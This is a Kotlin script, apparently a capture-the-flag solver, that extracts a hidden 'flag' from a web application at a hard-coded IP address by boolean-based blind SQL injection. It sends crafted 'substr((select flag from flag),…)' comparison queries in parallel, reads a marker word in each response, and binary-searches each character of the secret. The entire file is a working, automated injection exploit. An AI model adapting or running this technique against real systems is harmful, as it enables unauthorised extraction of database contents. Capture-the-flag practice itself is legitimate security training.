import io.ktor.client.HttpClient
import kotlinx.coroutines.*

fun main() {
  val alphaNumeric = ('0'..'}').toMutableList()
  val string = MutableList(100) { ' ' }
  val client = HttpClient()
  runBlocking {
    withContext(Dispatchers.IO) {
      for (i in 1..100) {
        launch {
          val binarySearch = alphaNumeric.binarySearch {
            runBlocking {
              compareTo(i, it, client)
            }
          }
          if(binarySearch==-1) return@launch;
          string[i - 1] = alphaNumeric[binarySearch]
          println(string.joinToString(separator = ""))
        }
      }
    }
  }
}

suspend fun compareTo(index: Int, char: Char, client: HttpClient): Int {
  val resLess = GlobalScope.async {
    download("http://157.245.202.4:1355/?q=%27+or+substr%28%28select+flag+from+flag%29%2C$index%2C1%29>\"$char\"%3B--&submit=Submit", client)
  }
  val resMore = GlobalScope.async {
    download("http://157.245.202.4:1355/?q=%27+or+substr%28%28select+flag+from+flag%29%2C$index%2C1%29<\"$char\"%3B--&submit=Submit", client)
  }
  if (resLess.await().contains("Wakanda")) return -1
  if (resMore.await().contains("Wakanda")) return 1
  return 0
}